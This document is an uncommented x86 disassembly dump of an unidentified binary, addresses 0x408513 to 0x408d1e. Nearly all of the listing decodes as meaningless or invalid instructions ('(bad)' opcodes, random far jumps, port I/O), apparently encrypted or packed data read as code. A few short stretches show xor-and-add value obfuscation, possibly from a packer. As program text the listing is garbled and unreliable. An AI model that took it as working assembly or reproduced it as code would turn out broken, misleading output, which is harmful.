  408513:	repnz cmp esp,DWORD PTR [esi-0x49]
  408517:	shl    DWORD PTR [edi],cl
  408519:	xchg   ah,ch
  40851b:	or     esi,ebx
  40851d:	jmp    0x13fc0966
  408522:	scas   eax,DWORD PTR es:[edi]
  408523:	fnstsw WORD PTR [eax]
  408525:	pop    ecx
  408526:	sbb    BYTE PTR [ebx],cl
  408528:	dec    edx
  408529:	pop    esi
  40852a:	fistp  WORD PTR [edx+0x4a]
  40852d:	(bad)  
  40852f:	aad    0x99
  408531:	mov    eax,0xf400ec9f
  408536:	mov    eax,ds:0x70d24c23
  40853b:	retf   
  40853c:	addr16 sbb eax,0xe9dfc55e
  408542:	mov    WORD PTR [edi+0x1aaf5083],?
  408548:	neg    DWORD PTR [edx+0x566e6c63]
  40854e:	hlt    
  40854f:	mov    dl,dl
  408551:	xchg   BYTE PTR [eax+0x1c660b9],dl
  408557:	call   0x9488f561
  40855c:	pop    ss
  40855d:	(bad)  
  40855e:	shl    BYTE PTR ds:0x907364ad,1
  408564:	xchg   ebx,eax
  408565:	(bad)  
  408566:	in     al,0x9c
  408568:	or     eax,0x8f77402a
  40856d:	inc    ecx
  40856e:	mov    bl,bl
  408570:	push   esp
  408571:	mov    dl,BYTE PTR [ecx+0x3c]
  408574:	jb     0x40858c
  408576:	in     eax,0xe6
  408578:	mov    dl,0xa7
  40857a:	ret    0x4b71
  40857d:	mov    DWORD PTR [edx+0x50f0ac46],esi
  408583:	outs   dx,BYTE PTR ds:[esi]
  408584:	fcmove st,st(6)
  408586:	cmp    DWORD PTR [edi],eax
  408588:	sbb    BYTE PTR [ebp-0xc3d6cdd],dh
  40858e:	push   DWORD PTR [edx+0x66f17a]
  408594:	push   ecx
  408595:	out    0xc3,al
  408597:	inc    edi
  408598:	sub    cl,dl
  40859a:	push   ecx
  40859b:	push   edi
  40859c:	lahf   
  40859d:	mov    ch,0x3d
  40859f:	xchg   ebp,eax
  4085a0:	pop    eax
  4085a1:	stc    
  4085a2:	push   es
  4085a3:	cld    
  4085a4:	test   eax,0x3371f69d
  4085a9:	pop    ecx
  4085aa:	jo     0x408543
  4085ac:	daa    
  4085ad:	mov    dl,0x6b
  4085af:	xchg   ecx,eax
  4085b0:	inc    ecx
  4085b1:	out    dx,eax
  4085b2:	lds    esp,FWORD PTR [ebx]
  4085b4:	ficomp WORD PTR [edi-0x40]
  4085b7:	jo     0x408625
  4085b9:	mov    al,0x28
  4085bb:	addr16 dec esp
  4085bd:	or     DWORD PTR [edx],ebp
  4085bf:	jmp    eax
  4085c1:	xor    al,0x8b
  4085c3:	retf   
  4085c4:	add    DWORD PTR [ecx-0x50],ebp
  4085c7:	in     al,0x11
  4085c9:	sbb    bh,BYTE PTR [eax]
  4085cb:	lock and DWORD PTR [edi+0x65],0xffffff8a
  4085d0:	xchg   esi,eax
  4085d1:	dec    ecx
  4085d2:	test   BYTE PTR [ebp+0x15],bl
  4085d5:	mov    gs,ebp
  4085d7:	jnp    0x4085c8
  4085d9:	gs jae 0x408628
  4085dc:	pop    es
  4085dd:	lock jge 0x4085fe
  4085e0:	xor    ebx,DWORD PTR [eax-0x56]
  4085e3:	mov    edx,0x60c66896
  4085e8:	gs mov ah,0x36
  4085eb:	and    DWORD PTR [edi],ebx
  4085ed:	push   cs
  4085ee:	adc    ebx,DWORD PTR [ebx+0x76]
  4085f1:	adc    eax,0xcc082335
  4085f6:	ret    0x9144
  4085f9:	sbb    cl,BYTE PTR [edi-0x11be7610]
  4085ff:	dec    esi
  408600:	shl    DWORD PTR [edi-0x426b222e],0x42
  408607:	and    ebp,ecx
  408609:	or     dl,bl
  40860b:	outs   dx,DWORD PTR ds:[esi]
  40860c:	add    DWORD PTR [edi],esi
  40860e:	sbb    eax,0x9df9bf8e
  408613:	mov    ecx,0xd88fd2e3
  408618:	jmp    0x644a:0x9fc25998
  40861f:	mov    eax,ds:0x1e322f35
  408624:	push   ds
  408625:	mov    BYTE PTR [edx-0x7b81236c],bl
  40862b:	and    DWORD PTR ds:0xe994c03e,0x57d42ea4
  408635:	mov    ebx,0x9913a5a7
  40863a:	retf   0xbbf8
  40863d:	pop    ecx
  40863e:	inc    ebx
  40863f:	inc    edx
  408640:	add    dl,al
  408642:	pushf  
  408643:	xor    DWORD PTR [esi],esp
  408645:	(bad)  
  408646:	imul   ecx,DWORD PTR [edx-0x78b1879e],0x7c
  40864d:	ss dec esi
  40864f:	lea    eax,[ecx+ebp*4+0x72]
  408653:	retf   0x8874
  408656:	hlt    
  408657:	cdq    
  408658:	inc    esi
  408659:	mov    ebp,0x2f352028
  40865e:	sbb    bl,bl
  408660:	pop    ebp
  408661:	pop    esp
  408662:	jae    0x408687
  408664:	cmp    eax,0x273dcef5
  408669:	cmp    ebp,eax
  40866b:	out    0x4b,eax
  40866d:	mov    cl,0xcc
  40866f:	std    
  408670:	mov    ds:0xfaef036e,al
  408675:	sahf   
  408676:	ds mov edi,0x78e68e8e
  40867c:	mov    al,ds:0x93f6cbc7
  408681:	dec    edx
  408682:	push   ecx
  408683:	sub    edi,DWORD PTR ds:0x5a44a2ea
  408689:	in     al,dx
  40868a:	das    
  40868b:	push   es
  40868c:	pavgb  mm5,mm6
  40868f:	jmp    0x1c88:0xbdc256df
  408696:	call   0xbb7fab66
  40869b:	mov    eax,0x818e12fe
  4086a0:	adc    eax,0x433763
  4086a5:	sti    
  4086a6:	ss inc ebx
  4086a8:	add    BYTE PTR [ecx+0x1d81f45d],cl
  4086ae:	out    dx,eax
  4086af:	aaa    
  4086b0:	inc    ebx
  4086b1:	add    BYTE PTR [edi],ah
  4086b3:	cmp    BYTE PTR [ebx+0x0],al
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x5763acb6],ecx
  4086ca:	jmp    0x7c24:0x7e7ed68a
  4086d1:	jle    0x408751
  4086d3:	add    eax,0x3bffc2d
  4086d8:	mov    esp,0x765b328e
  4086dd:	push   0x937c50da
  4086e2:	into   
  4086e3:	add    al,0xb3
  4086e5:	sbb    DWORD PTR [ebx],ebx
  4086e7:	stos   DWORD PTR es:[edi],eax
  4086e8:	lea    ebp,[ebx]
  4086ea:	and    eax,esp
  4086ec:	rol    BYTE PTR [ebx+0x60184b45],cl
  4086f2:	xchg   esi,eax
  4086f3:	pop    eax
  4086f4:	jnp    0x4086c7
  4086f6:	xlat   BYTE PTR ds:[ebx]
  4086f7:	jae    0x40873b
  4086f9:	adc    dl,BYTE PTR [eax+0x75a4a34c]
  4086ff:	jg     0x408749
  408701:	fimul  DWORD PTR [esi-0x44]
  408704:	data16 cmp ch,ch
  408707:	pop    ds
  408708:	ret    
  408709:	dec    eax
  40870a:	ss gs pop ecx
  40870d:	mov    dl,0xe6
  40870f:	or     BYTE PTR [edi+esi*1],dh
  408712:	dec    BYTE PTR gs:[eax-0x70e1cf5e]
  408719:	sbb    eax,0x634501ea
  40871e:	int    0xba
  408720:	sub    eax,0xe754e2d9
  408725:	test   BYTE PTR [edx+0x10],ah
  408728:	jns    0x4086c5
  40872a:	sbb    BYTE PTR ss:[edx+0x42],bl
  40872e:	fst    QWORD PTR [esi]
  408730:	push   ecx
  408731:	hlt    
  408732:	std    
  408733:	xor    al,0x9c
  408735:	or     DWORD PTR [ebp-0x7d],eax
  408738:	mov    ds:0xee0dc513,eax
  40873d:	cmp    DWORD PTR [esi-0x570738bf],esp
  408743:	mov    ch,0x1
  408745:	pop    ebx
  408746:	jne    0x408768
  408748:	scas   eax,DWORD PTR es:[edi]
  408749:	daa    
  40874a:	cdq    
  40874b:	or     DWORD PTR [ebx+0x57],esp
  40874e:	mov    bl,BYTE PTR [edi-0x1e]
  408751:	js     0x40877b
  408753:	(bad)  
  408755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408756:	sti    
  408757:	sbb    BYTE PTR [ebx+0x410f7d82],0xfd
  40875e:	jb     0x40872b
  408760:	sbb    DWORD PTR [esi-0x6887c77],esi
  408766:	pusha  
  408767:	jp     0x4086f6
  408769:	adc    eax,0x907c2cf7
  40876e:	fwait
  40876f:	scas   eax,DWORD PTR es:[edi]
  408770:	jecxz  0x4087bf
  408772:	cwde   
  408773:	fidivr WORD PTR [ecx+0x4f]
  408776:	sub    DWORD PTR [ecx],eax
  408778:	inc    esi
  408779:	lods   al,BYTE PTR ds:[esi]
  40877a:	repz popf 
  40877c:	or     BYTE PTR [esi-0x48],0x90
  408780:	xchg   esp,eax
  408781:	push   cs
  408782:	adc    eax,0xa1737765
  408787:	push   es
  408788:	pop    ebx
  408789:	inc    ecx
  40878a:	repz das 
  40878c:	xor    DWORD PTR [esi-0x31],ebp
  40878f:	add    al,0xa0
  408791:	out    0x5f,al
  408793:	xchg   ecx,eax
  408794:	add    eax,DWORD PTR [esi-0x13]
  408797:	adc    bl,al
  408799:	pop    esp
  40879a:	adc    BYTE PTR [ebx+0x3e0ce262],bl
  4087a0:	test   eax,0x25956ae
  4087a5:	pop    ds
  4087a6:	xchg   ebx,eax
  4087a7:	jne    0x4087c3
  4087a9:	pusha  
  4087aa:	or     bl,BYTE PTR [ebp-0x6a2f8778]
  4087b0:	jp     0x408740
  4087b2:	inc    ecx
  4087b3:	cwde   
  4087b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087b5:	add    BYTE PTR [ebx],ch
  4087b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087b8:	ss out dx,eax
  4087ba:	and    DWORD PTR ds:0xb1d0883c,esi
  4087c0:	fstp   TBYTE PTR [edi-0x296e6eef]
  4087c6:	jecxz  0x40874e
  4087c8:	retf   0xdf44
  4087cb:	sub    dh,BYTE PTR [edi+0xfb7e420]
  4087d1:	test   al,0x95
  4087d3:	ret    
  4087d4:	shl    DWORD PTR [edi-0x6f],0x15
  4087d8:	loopne 0x40878b
  4087da:	push   ds
  4087db:	mov    esi,0x6e2edf7
  4087e0:	pop    ss
  4087e1:	test   BYTE PTR [eax+0x4ab518b1],0xf8
  4087e8:	push   cs
  4087e9:	pop    ecx
  4087ea:	or     ebp,edx
  4087ec:	pop    es
  4087ed:	inc    ebx
  4087ee:	aam    0x81
  4087f0:	fwait
  4087f1:	test   DWORD PTR [esi-0x5b912e42],0xa3e89488
  4087fb:	or     al,0x66
  4087fd:	cld    
  4087fe:	outs   dx,BYTE PTR ds:[esi]
  4087ff:	ins    BYTE PTR es:[edi],dx
  408800:	scas   eax,DWORD PTR es:[edi]
  408801:	shl    DWORD PTR [ebx+0xa5b60d8],0x7c
  408808:	enter  0xcb82,0x4
  40880c:	cmp    esi,ebp
  40880e:	in     al,dx
  40880f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408810:	scas   eax,DWORD PTR es:[edi]
  408811:	mov    ds:0xafbeaeb2,al
  408816:	jl     0x4087de
  408818:	jb     0x40885a
  40881a:	jne    0x4087e5
  40881c:	dec    edi
  40881d:	aas    
  40881e:	cli    
  40881f:	pop    edi
  408820:	jmp    0x817:0x1a20000a
  408827:	xchg   BYTE PTR [esi+0x0],ah
  40882a:	add    eax,0x911c088b
  40882f:	lods   al,BYTE PTR ds:[esi]
  408830:	cmp    bl,BYTE PTR [ecx+0x19]
  408833:	int    0xb1
  408835:	sbb    BYTE PTR [eax+0x30],ch
  408838:	pop    es
  408839:	dec    esp
  40883a:	neg    DWORD PTR [eax-0x4d921b2]
  408840:	push   edi
  408841:	push   ebp
  408842:	in     eax,0x28
  408844:	gs mov esi,0x27417163
  40884a:	mov    edi,edi
  40884c:	and    BYTE PTR [ecx-0x46],bh
  40884f:	les    esp,FWORD PTR ds:0x78640674
  408855:	pop    edi
  408856:	loop   0x408870
  408858:	ficom  WORD PTR [esi-0x6d]
  40885b:	ror    dh,1
  40885d:	add    DWORD PTR [esp+esi*8-0x55867439],ebx
  408864:	lea    edi,[ecx-0x4f]
  408867:	or     bl,dh
  408869:	fild   WORD PTR [edx-0x5c5a236e]
  40886f:	lock (bad) 
  408871:	mov    bl,0x7f
  408873:	adc    bh,ch
  408875:	mov    cl,0xe
  408877:	jb     0x4088ed
  408879:	and    al,0x55
  40887b:	fs loop 0x408847
  40887e:	loope  0x4088fa
  408880:	repz mov ds:0x99e1bf09,al
  408886:	in     al,dx
  408887:	fadd   QWORD PTR [ecx]
  408889:	adc    eax,0x23f6db0f
  40888e:	mov    ch,0xf0
  408890:	add    DWORD PTR [esp+ebx*1],ecx
  408893:	mov    edx,0x972db0f6
  408898:	imul   eax,DWORD PTR [edi-0x66fd7ead],0x53
  40889f:	pop    eax
  4088a0:	ret    
  4088a1:	and    al,0x55
  4088a3:	jo     0x40886a
  4088a5:	pop    ebp
  4088a6:	push   es
  4088a7:	pop    ss
  4088a8:	rol    BYTE PTR [ebx+0x70],0x37
  4088ac:	sub    eax,0xb2ca8293
  4088b1:	pop    eax
  4088b2:	xchg   ebp,eax
  4088b3:	mov    dl,0x41
  4088b5:	add    al,0xc6
  4088b7:	add    eax,0xe90abc55
  4088bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088bd:	cld    
  4088be:	dec    ebx
  4088bf:	push   0xb5e3206
  4088c4:	mov    cl,0x16
  4088c6:	shl    BYTE PTR [edx+0x6a53a297],1
  4088cc:	ret    0x2273
  4088cf:	and    eax,0xc1b603bd
  4088d4:	push   ecx
  4088d5:	or     ebx,DWORD PTR [ebx+0x57]
  4088d8:	or     DWORD PTR es:[esi-0x39],ebx
  4088dc:	dec    BYTE PTR [ebp-0x6c2fffe]
  4088e2:	jo     0x40886f
  4088e4:	sub    edi,DWORD PTR ds:0xc8db6817
  4088ea:	adc    DWORD PTR [eax+0x9],ecx
  4088ed:	inc    ebx
  4088ee:	xor    BYTE PTR ds:0x3955e87e,0xc3
  4088f5:	cmp    ebx,0xffffff97
  4088f8:	je     0x408888
  4088fa:	xchg   ebx,eax
  4088fb:	dec    ebx
  4088fc:	les    ecx,FWORD PTR [ebx+0x63358100]
  408902:	aaa    
  408903:	inc    ebx
  408904:	add    BYTE PTR [edx],ch
  408906:	jl     0x408908
  408908:	add    BYTE PTR [esi-0x75],ah
  40890b:	dec    ebp
  40890c:	cld    
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0xb975782c
  408968:	aas    
  408969:	mov    al,0xd4
  40896b:	jle    0x4089eb
  40896d:	and    al,0x7c
  40896f:	jle    0x4089ef
  408971:	sub    ecx,esp
  408973:	xor    al,0xa0
  408975:	mov    ah,0x7e
  408977:	leave  
  408978:	mov    bl,ah
  40897a:	fsubr  QWORD PTR [esp+edx*8-0x26054dd0]
  408981:	dec    edi
  408982:	mov    fs,ecx
  408984:	repz es or ecx,ecx
  408988:	data16 int3 
  40898a:	(bad)  
  40898b:	or     eax,0xbd3ab472
  408990:	stos   BYTE PTR es:[edi],al
  408991:	dec    esi
  408992:	xor    esp,DWORD PTR [edi-0x61d487d]
  408998:	jb     0x408971
  40899a:	(bad)
  40899e:	imul   ebx,DWORD PTR [eax-0x40f50924],0x3d
  4089a5:	mov    al,ds:0x80759e11
  4089aa:	xchg   BYTE PTR [eax+0x1ffd6de9],dh
  4089b0:	stc    
  4089b1:	adc    eax,0x9e1df91c
  4089b6:	stos   BYTE PTR es:[edi],al
  4089b7:	pop    esi
  4089b8:	imul   esp,DWORD PTR [edx-0xff626b5],0xd73f9443
  4089c2:	and    cl,BYTE PTR [edx]
  4089c4:	push   ecx
  4089c5:	popa   
  4089c6:	and    eax,0x80999166
  4089cb:	push   0x30
  4089cd:	sbb    dh,BYTE PTR [edi]
  4089cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089d0:	sbb    ebp,ebp
  4089d2:	int    0xba
  4089d4:	out    dx,eax
  4089d5:	mov    al,ds:0x421c2b2f
  4089da:	jp     0x4089ac
  4089dc:	jns    0x408a3f
  4089de:	push   cs
  4089df:	dec    edi
  4089e0:	dec    ebp
  4089e1:	jp     0x408a5d
  4089e3:	jbe    0x408a37
  4089e5:	mov    edx,0xc2b54a05
  4089ea:	adc    BYTE PTR [ebx],al
  4089ec:	push   ds
  4089ed:	xchg   esp,eax
  4089ee:	pop    edx
  4089ef:	cli    
  4089f0:	ds scas al,BYTE PTR es:[edi]
  4089f2:	shl    BYTE PTR [ebx+0x41272d25],cl
  4089f8:	xchg   ebp,eax
  4089f9:	cmp    esi,DWORD PTR ds:0xdd620e92
  4089ff:	dec    eax
  408a00:	and    al,0x47
  408a02:	outs   dx,DWORD PTR ds:[esi]
  408a03:	xor    ebp,esi
  408a05:	mov    bh,0x5f
  408a07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a08:	xchg   ebx,eax
  408a09:	inc    ecx
  408a0a:	pop    edx
  408a0b:	jmp    0x1532b56b
  408a10:	adc    eax,ebx
  408a12:	out    0x18,al
  408a14:	pop    edi
  408a15:	xchg   bl,dl
  408a17:	loopne 0x408a3d
  408a19:	std    
  408a1a:	cdq    
  408a1b:	popa   
  408a1c:	sbb    edi,ebp
  408a1e:	add    BYTE PTR [eax],bl
  408a20:	mov    edi,0xb4778d38
  408a25:	mov    cl,0x9
  408a27:	jnp    0x408a1a
  408a29:	push   esi
  408a2a:	push   edi
  408a2b:	add    DWORD PTR [edi-0x71],ebp
  408a2e:	fwait
  408a2f:	cwde   
  408a30:	out    0x56,eax
  408a32:	push   edx
  408a33:	cmp    eax,0x785d1fc3
  408a38:	das    
  408a39:	jmp    0x1c79f71d
  408a3e:	push   eax
  408a3f:	add    al,0x2e
  408a41:	inc    ebp
  408a42:	cld    
  408a43:	cmc    
  408a44:	rcl    BYTE PTR cs:[esi],1
  408a47:	cmp    eax,DWORD PTR [ecx]
  408a49:	ins    DWORD PTR es:[edi],dx
  408a4a:	leave  
  408a4b:	mov    esp,0x6f63df8c
  408a50:	(bad)  
  408a51:	push   cs
  408a52:	jns    0x4089e8
  408a54:	mov    BYTE PTR [ebx-0x6b],ch
  408a57:	or     esi,DWORD PTR [edx]
  408a59:	pop    ss
  408a5a:	inc    esi
  408a5b:	mov    WORD PTR [esi],fs
  408a5d:	or     al,0x37
  408a5f:	fst    DWORD PTR [eax+0x28]
  408a62:	mov    cl,0x69
  408a64:	aad    0x24
  408a66:	mov    bh,0x90
  408a68:	or     BYTE PTR [edx-0x4e],0x48
  408a6c:	in     al,dx
  408a6d:	push   ds
  408a6e:	sbb    al,0xb0
  408a70:	scas   al,BYTE PTR es:[edi]
  408a71:	xchg   ecx,eax
  408a72:	lahf   
  408a73:	icebp  
  408a74:	mov    ch,0x97
  408a76:	bswap  ebx
  408a78:	(bad)  
  408a79:	retf   0x8a5c
  408a7c:	aad    0x72
  408a7e:	test   al,0x43
  408a80:	jae    0x408aa6
  408a82:	add    ch,BYTE PTR [eax+0x3a335497]
  408a88:	cmp    BYTE PTR [esi],bh
  408a8a:	and    esi,DWORD PTR ss:[ebx+esi*2+0x3f]
  408a8f:	retf   0x6461
  408a92:	js     0x408a19
  408a94:	sub    eax,0x75bda177
  408a99:	or     esi,DWORD PTR [eax+0x3d8e065a]
  408a9f:	or     al,0x9b
  408aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408aa2:	aas    
  408aa3:	mov    cl,dh
  408aa5:	and    DWORD PTR [edx+0x46e2522f],0xffffffb2
  408aac:	dec    edx
  408aad:	inc    edi
  408aae:	add    DWORD PTR [edx+0x20],eax
  408ab1:	ret    0x174f
  408ab4:	in     al,0x6c
  408ab6:	fistp  QWORD PTR [esi+0x6b]
  408ab9:	cld    
  408aba:	aas    
  408abb:	test   DWORD PTR [edi+0x4d],esp
  408abe:	imul   edi,DWORD PTR [eax-0x2e],0x44009734
  408ac5:	cmp    ebx,DWORD PTR [esp+esi*4-0x2eff8883]
  408acc:	jo     0x408ae3
  408ace:	dec    eax
  408acf:	mov    bh,BYTE PTR [esp+edx*2-0x77]
  408ad3:	fcom   DWORD PTR [ebp+0x54]
  408ad6:	loopne 0x408ab7
  408ad8:	cld    
  408ad9:	push   0x2ab5bf78
  408ade:	and    dh,BYTE PTR [ebx]
  408ae0:	push   0xfffffffe
  408ae2:	adc    al,BYTE PTR [esi]
  408ae4:	ss mov esp,0xc94404cc
  408aea:	call   0x3541:0xa0ccacde
  408af1:	(bad)  
  408af2:	xchg   edi,eax
  408af3:	jnp    0x408b3c
  408af5:	mov    ds:0x63229619,al
  408afa:	xchg   esi,eax
  408afb:	ins    DWORD PTR es:[edi],dx
  408afc:	pop    esp
  408afd:	cmp    BYTE PTR [edi+0x6a08037],dh
  408b03:	add    DWORD PTR [edi],esp
  408b05:	inc    ecx
  408b06:	jbe    0x408abf
  408b08:	(bad)  ds:0x387717b2
  408b0e:	sub    ah,0x31
  408b11:	jae    0x408aba
  408b13:	fs sbb al,0x9
  408b16:	fdiv   st,st(2)
  408b18:	adc    eax,0x706f2303
  408b1d:	into   
  408b1e:	sub    DWORD PTR [esi+0x72d4ebdd],ebx
  408b24:	cmp    eax,DWORD PTR [esp+ebp*8-0x628506cb]
  408b2b:	push   ecx
  408b2c:	les    ecx,FWORD PTR [esi-0x38aa532c]
  408b32:	sti    
  408b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b34:	inc    eax
  408b35:	aad    0x47
  408b37:	dec    ecx
  408b38:	test   al,0x22
  408b3a:	rcl    DWORD PTR [eax],0xa8
  408b3d:	push   esp
  408b3e:	sahf   
  408b3f:	pop    ss
  408b40:	jl     0x408b33
  408b42:	pop    ebx
  408b43:	lods   eax,DWORD PTR ds:[esi]
  408b44:	add    eax,0x45997936
  408b49:	fwait
  408b4a:	scas   al,BYTE PTR es:[edi]
  408b4b:	sbb    al,0xb0
  408b4d:	add    esi,0x67
  408b50:	out    0xc9,al
  408b52:	add    eax,DWORD PTR [eax+0x714dfd5e]
  408b58:	xlat   BYTE PTR ds:[ebx]
  408b59:	out    dx,eax
  408b5a:	inc    esi
  408b5b:	nop
  408b5c:	clc    
  408b5d:	add    cl,0xa7
  408b60:	dec    esi
  408b61:	add    bh,BYTE PTR [ebx+0x729dbed3]
  408b67:	jge    0x408b4b
  408b69:	or     eax,0x2867311e
  408b6e:	mov    ebp,0x459791d3
  408b73:	add    cl,BYTE PTR [ebx]
  408b75:	add    eax,0x211bf933
  408b7a:	jmp    0x36ae403a
  408b7f:	mov    bl,0x77
  408b81:	hlt    
  408b82:	mov    ebp,0x2f6c2a38
  408b87:	cmp    ebp,DWORD PTR ds:0x7dc7a8a7
  408b8d:	shld   ebp,esp,cl
  408b90:	out    0xfd,al
  408b92:	add    al,0xc7
  408b94:	(bad)  
  408b95:	sbb    esi,DWORD PTR [esi+0x74a29d92]
  408b9b:	jne    0x408bbe
  408ba1:	mov    eax,DWORD PTR [ebp+0x8]
  408ba4:	mov    ecx,DWORD PTR [ebp-0x10]
  408ba7:	xor    eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	mov    ebp,0x66b6bcc2
  408bf5:	sar    BYTE PTR [esi+0x7e],cl
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	mov    DWORD PTR [ecx+esi*2-0x67],esi
  408c00:	cmc    
  408c01:	mov    ds:0x7e5df445,eax
  408c06:	push   edx
  408c07:	mov    bh,0xae
  408c09:	inc    edi
  408c0a:	and    ch,ah
  408c0c:	arpl   WORD PTR [ecx-0x42],bp
  408c0f:	xchg   edx,eax
  408c10:	adc    eax,0x4df335a9
  408c15:	(bad)  
  408c17:	out    0x8e,eax
  408c19:	mov    ss,WORD PTR [ebx+ebx*1+0x4c]
  408c1d:	sbb    eax,0xd1183345
  408c22:	pushf  
  408c23:	rcl    ah,cl
  408c25:	xchg   esi,eax
  408c26:	hlt    
  408c27:	js     0x408c40
  408c29:	jecxz  0x408baf
  408c2b:	mov    BYTE PTR [edx+eiz*8+0x19],bl
  408c2f:	mov    esi,0xf230139c
  408c34:	mov    esp,gs
  408c36:	add    edx,DWORD PTR [esi+0x5f]
  408c39:	xchg   ebp,eax
  408c3a:	in     al,0xb9
  408c3c:	pop    edx
  408c3d:	jge    0x408c88
  408c3f:	or     dh,dh
  408c41:	pop    esp
  408c42:	xor    dh,BYTE PTR [esi+edx*2+0x4a]
  408c46:	retf   0xcd36
  408c49:	jmp    0x4afa:0x8442e57f
  408c50:	xor    BYTE PTR [eax],dl
  408c52:	or     ebp,esi
  408c54:	add    ah,cl
  408c56:	outs   dx,DWORD PTR es:[esi]
  408c58:	xor    eax,0x2775c951
  408c5d:	pop    edi
  408c5e:	xchg   esp,eax
  408c5f:	aad    0x3e
  408c61:	mov    dl,0x9e
  408c63:	sti    
  408c64:	push   ds
  408c65:	pusha  
  408c66:	mov    ebp,0x33afd979
  408c6b:	inc    ebx
  408c6c:	jbe    0x408cde
  408c6e:	frstor [ebp+0x67432885]
  408c74:	das    
  408c75:	test   eax,0xaa82a82c
  408c7a:	in     al,0x72
  408c7c:	les    edx,FWORD PTR [ebx]
  408c7e:	cmp    dl,BYTE PTR cs:[edx+0x39b8148d]
  408c85:	gs jmp 0x3184:0x6d5b2560
  408c8d:	sub    al,BYTE PTR [esi+ebp*4]
  408c90:	iret   
  408c91:	jae    0x408cb0
  408c93:	or     DWORD PTR [ebp-0x46bb4c6a],ebx
  408c99:	test   DWORD PTR [ebp+0x62],esp
  408c9c:	into   
  408c9d:	in     al,dx
  408c9e:	dec    ebp
  408c9f:	inc    edx
  408ca0:	adc    al,0x6e
  408ca2:	fist   DWORD PTR [ebx-0x2efde68f]
  408ca8:	call   0xa184:0xeebae0e3
  408caf:	mov    ds:0xafb4ea21,eax
  408cb4:	test   eax,0xf117c04f
  408cb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cba:	ficom  WORD PTR [edx]
  408cbc:	adc    edi,esi
  408cbe:	ret    0x4110
  408cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc2:	mov    ebp,0x163d64cf
  408cc7:	inc    ebx
  408cc8:	stos   DWORD PTR es:[edi],eax
  408cc9:	into   
  408cca:	sub    DWORD PTR [ebx+0x38a21e64],esi
  408cd0:	cmp    eax,0x38d990d0
  408cd5:	lods   al,BYTE PTR ds:[esi]
  408cd6:	mov    eax,DWORD PTR [ecx+0x3ecceb9e]
  408cdc:	ins    DWORD PTR es:[edi],dx
  408cdd:	jle    0x408d26
  408cdf:	push   edx
  408ce0:	dec    ebp
  408ce1:	cmp    edi,DWORD PTR [eax-0x53]
  408ce4:	std    
  408ce5:	fwait
  408ce6:	xchg   dh,dh
  408ce8:	sbb    ecx,ebx
  408cea:	dec    eax
  408ceb:	inc    esp
  408cec:	call   DWORD PTR [eax-0x4072afc2]
  408cf2:	aaa    
  408cf3:	vunpckhps xmm2,xmm1,XMMWORD PTR [edi]
  408cf7:	and    esi,DWORD PTR [edx]
  408cf9:	fwait
  408cfa:	addr16 test eax,0xd513647
  408d00:	stc    
  408d01:	cli    
  408d02:	xchg   esi,edx
  408d04:	das    
  408d05:	adc    ecx,eax
  408d07:	xlat   BYTE PTR ds:[ebx]
  408d08:	jb     0x408d3c
  408d0a:	dec    eax
  408d0b:	inc    eax
  408d0c:	jno    0x408d4b
  408d0e:	ret    0x37ab
  408d11:	(bad)  
  408d12:	aam    0x1e
  408d14:	(bad)  
  408d15:	push   0xffffff8b
  408d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d18:	cld    
  408d19:	inc    DWORD PTR [edi-0x6c]
  408d1c:	dec    ebp
  408d1d:	outs   dx,BYTE PTR ds:[esi]
  408d1e:	(bad)  
